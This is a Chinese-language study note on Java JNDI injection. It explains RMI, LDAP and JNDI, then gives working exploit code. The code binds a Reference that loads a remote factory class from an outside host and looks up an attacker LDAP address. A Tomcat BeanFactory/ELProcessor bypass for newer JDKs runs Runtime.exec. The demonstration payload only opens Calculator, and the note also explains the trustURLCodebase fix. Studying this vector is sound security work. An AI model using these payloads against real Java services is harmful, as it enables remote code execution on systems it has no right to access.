## JNDI注入

### 一、RMI协议：

#### 1、简介：

RMI（**Remote Method Invocation**）是 Java 中的一种远程通信机制，它允许程序调用运行在不同 Java 虚拟机（JVM）中的对象的方法，甚至是运行在不同计算机上的 Java 程序之间。RMI 是一种面向对象的通信方式，基于 Java 平台的分布式计算技术，能够实现跨网络进行远程通信。



#### 2、工作原理：

1、**RMI 注册表 (RMI Registry)**： RMI 注册表是 RMI 机制的核心，它是一个服务进程，允许客户端通过一个名字查找远程对象。当远程对象（如服务端）启动时，它会把自己绑定到 RMI 注册表中，而客户端则通过 RMI 注册表查找这个远程对象。



2、**Stub 和 Skeleton**：

**Stub（存根）**：是客户端的一部分，充当代理对象，负责将远程方法调用转换为网络请求，发送到远程服务器。它将调用数据和方法传输到服务器端并等待响应。

**Skeleton（骨架）**：是服务端的一部分，负责接收从客户端来的远程调用请求，解码请求并调用实际的服务端实现方法。骨架并不直接存在于现代 RMI 中，因为在 RMI 2.0 之后，RMI 通过动态代理取代了骨架的作用。



3、**远程接口 (Remote Interface)**： 远程接口定义了客户端可以远程调用的方法。远程接口需要继承 `Remote` 接口。只有继承了 `Remote` 接口的方法才能被远程调用。



4、**远程对象 (Remote Object)**： 远程对象实现了远程接口，并且通常继承了 `UnicastRemoteObject` 类。服务端的远程对象需要通过 RMI 注册表进行注册，使客户端能够查找到它。



#### 3、代码实现：

1、定义远程接口并构造供用户远程调用的方法：

```java
//定义一个远程接口
public interface RemoteObj extends Remote {  //远程接口需继承
    public String sayHello(String words) throws RemoteException;
}
```



2、实现远程接口，并继承 `UnicastRemoteObject`。这使得对象能够在网络中进行通信。

```java
public class RemoteObjImpl extends UnicastRemoteObject implements RemoteObj {
    public RemoteObjImpl() throws RemoteException{
    }

    @Override
    public String sayHello(String words) throws RemoteException {
        return words;
    }
}
```



3、创建注册表，注册远程对象：

```java
public class RMIServer {
    public static void main(String[] args) throws NamingException, RemoteException, AlreadyBoundException {
        RemoteObjImpl remoteObj = new RemoteObjImpl();
        Registry registry = LocateRegistry.createRegistry(1888);
        registry.bind("remoteObj", remoteObj);
    }
}
```



4、创建客户端（用户端）：

```java
public class RMIClient {
    public static void main(String[] args) throws RemoteException, NotBoundException {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1",1888);
        System.out.println("Attempting to connect to RMI server...");
        RemoteObj remoteobj = (RemoteObj) registry.lookup("remoteObj");
        String res =remoteobj.sayHello("Test");
        System.out.println(res);
    }
}
```



先启动服务端 RMIServer -> 再启动客户端 RMIClient -> 成功执行：

![image-20241123134808370](/Users/gehansheng/Library/Application Support/typora-user-images/image-20241123134808370.png)



### 二、LDAP协议：

#### 1、简介：

LDAP（Lightweight Directory Access Protocol ，轻型目录访问协议）是一种目录服务协议，运行在`TCP/IP堆栈`之上。LDAP目录服务是由目录数据库和一套访问协议组成的系统，目录服务是一个特殊的数据库，用来保存描述性的、基于属性的详细信息，能进行查询、浏览和搜索，以树状结构组织数据。LDAP目录服务基于客户端-服务器模型，它的功能用于对一个存在目录数据库的访问。 LDAP目录和RMI注册表的区别在于是前者是目录服务，并允许分配存储对象的属性。



#### 2、应用场景：

如用户身份认证，sso，查询用户信息等。

```java
Hashtable<String, String> env = new Hashtable<>();
env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
env.put(Context.PROVIDER_URL, "ldap://localhost:389");
env.put(Context.SECURITY_AUTHENTICATION, "simple");
env.put(Context.SECURITY_PRINCIPAL, "uid=john.doe,ou=People,dc=example,dc=com"); // 用户 DN
env.put(Context.SECURITY_CREDENTIALS, "password"); // 用户密码

try {
    DirContext ctx = new InitialDirContext(env);
    System.out.println("Authentication successful!");
    ctx.close();
} catch (AuthenticationException e) {
    System.out.println("Authentication failed: " + e.getMessage());
}

```





### 三、JNDI：

#### 1、JNDI简介：

JNDI 是 Java 提供的一种接口，用于统一访问命名和目录服务。它支持多种协议，例如 LDAP、RMI、DNS 等。

(1) 通过 `InitialContext`，可以从远程服务加载对象并实例化。

(2) 查找和绑定：

**查找（Lookup）**: 从命名上下文中获取对象。

**绑定（Bind/Rebind）**: 将对象绑定到一个名称。



#### 2、JNDI注入：

##### 1、 RMI + JNDI：

(1) 首先启动 RMIServer服务：

```java
public class RMIServer {
    public static void main(String[] args) throws NamingException, RemoteException, AlreadyBoundException {
        RemoteObjImpl remoteObj = new RemoteObjImpl();
        Registry registry = LocateRegistry.createRegistry(1888);
        registry.bind("remoteObj", remoteObj);
    }
}
```



(2) 接着启动 JNDI_RMIServer，将 reference对象绑定到 rmi服务中：

```java
public class JDNI_RMIServer {
    public static void main(String[] args) throws NamingException {
        InitialContext initialContext = new InitialContext();
        //创建Reference对象，恶意类可以使用yakit进行构造
        Reference reference = new Reference("ObFZSwUr", "ObFZSwUr", "http://192.168.43.95:8085/");
        //将Reference对象绑定到rmi服务上
        initialContext.rebind("rmi://localhost:1888/remoteObj", reference);
    }
}
```

ObFZSwUr - 第一个参数：目标类名称，即需要加载/实例化的类

ObFZSwUr - 第二个参数：表示工厂类的名称。工厂类负责根据 JNDI 的查询创建或返回目标对象实例

http://192.168.43.95:8085/ - 第三个参数：加载工厂类的url （通常使用yakit）



(3) 最后运行 JNDI_RMIClient服务端，成功RCE弹出计算器：

```java
public class JNDI_RMIClient {

    public static void main(String[] args) throws NamingException, RemoteException {
        InitialContext initialContext = new InitialContext();
        RemoteObj remoteObj = (RemoteObj) initialContext.lookup("rmi://localhost:1888/remoteObj");
        System.out.println(remoteObj.sayHello("Success"));
    }
}
```

![image-20241124093542560](/Users/gehansheng/Library/Application Support/typora-user-images/image-20241124093542560.png)



(4) 实现原理：

javax/naming/spi/NamingManager.java 中会先对目标类在本地进行查找，若未找到，则会定义一个变量 codebase进行远程加载，若远程加载地址可控，可加载恶意类造成RCE：

```Java
// Try to use current class loader
        try {
             clas = helper.loadClass(factoryName);
        } catch (ClassNotFoundException e) {
            // ignore and continue
            // e.printStackTrace();
        }
        // All other exceptions are passed up.

        // Not in class path; try to use codebase
        String codebase;
        if (clas == null &&
                (codebase = ref.getFactoryClassLocation()) != null) {
            try {
                clas = helper.loadClass(factoryName, codebase);
            } catch (ClassNotFoundException e) {
            }
        }

        return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
```



(5) 修复方案：

后续jdk更新中增加了一个布尔类trustURLCodebase，默认值为false：

```java
+    /**
+     * Determines whether classes may be loaded from an arbitrary URL code base.
+     */
+    public static final boolean trustURLCodebase;
+    static {
+        // System property to control whether classes may be loaded from an
+        // arbitrary URL code base
+        PrivilegedAction<String> act = () -> System.getProperty(
+            "com.sun.jndi.cosnaming.object.trustURLCodebase", "false");
+        String trust = AccessController.doPrivileged(act);
+        trustURLCodebase = "true".equalsIgnoreCase(trust);
+    }
```



手动设置为 true，可以使用 -D 参数来设置系统属性：

```java
java -Dcom.sun.jndi.cosnaming.object.trustURLCodebase=true -jar your-application.jar

```





##### 2、LDAP + JNDI:

```java
public class JNDI_LDAPClient {
    public static void main(String[] args) throws NamingException {
        InitialContext initialContext = new InitialContext();
        initialContext.lookup("ldap://192.168.43.95:8085/ObFZSwUr");
    }
}
```

 ![image-20241124113738571](/Users/gehansheng/Library/Application Support/typora-user-images/image-20241124113738571.png)



##### 3、高版本jdk绕过 trustURLCodebase：

Java 8u191之后，JNDI客户端在接受远程引用对象的时候，不使用classFactoryLoction，但是我们还是可以通过JavaFactory来指定一个任意的工厂类，这个类时用于从攻击者控制的Reference对象中提取真实的对象。

这个工厂类需要满足以下几个条件：

(1) 真实对象要求必须存在目标系统的classpath。

(2) 工厂类必须实现 javax.naming.spi.ObjectFactory 接口，并且至少存在一个 getObjectInstance() 方法。



org.apache.naming.factory.BeanFactory 满足条件，可以被利用。

org.apache.naming.factory.BeanFactory 默认存在于Tomcat依赖包中，比如 Tomcat 8.5.24版本，因为在 tomcat 8.5.x较新分支 以及 9.x 系列被移除，增强了安全性。



在 pom.xml 中添加合适版本的 tomcat依赖:

```Java
        <dependency>
            <groupId>org.apache.tomcat.embed</groupId>
            <artifactId>tomcat-embed-core</artifactId>
            <version>8.5.24</version> <!-- 使用最新版本 -->
        </dependency>
        <dependency>
            <groupId>org.apache.tomcat.embed</groupId>
            <artifactId>tomcat-embed-jasper</artifactId>
            <version>8.5.24</version>
        </dependency>
```





JNDI_BYPASS_Server:

```Java
public class JNDI_BYPASS_Server {
    public static void main(String[] args) {
        try {
            Registry registry = LocateRegistry.createRegistry(1098);
            ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", (String)null, "", "", true, "org.apache.naming.factory.BeanFactory", (String)null);
            resourceRef.add(new StringRefAddr("forceString", "a=eval"));
            resourceRef.add(new StringRefAddr("a", "Runtime.getRuntime().exec(\"open -a Calculator\")"));
            //触发点在resourceRef的getObjectInstance()方法中
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);
            registry.bind("Exploit", referenceWrapper);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```



JNDI_BYPASS_Client:

```Java
public class JNDI_BYPASS_Client {
    public static void main(String[] args) {
        try {
            // 配置 JNDI 地址
            InitialContext context = new InitialContext();
            System.out.println("Looking up malicious object...");

            // 触发 RMI 查找
            context.lookup("rmi://127.0.0.1:1098/Exploit");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```



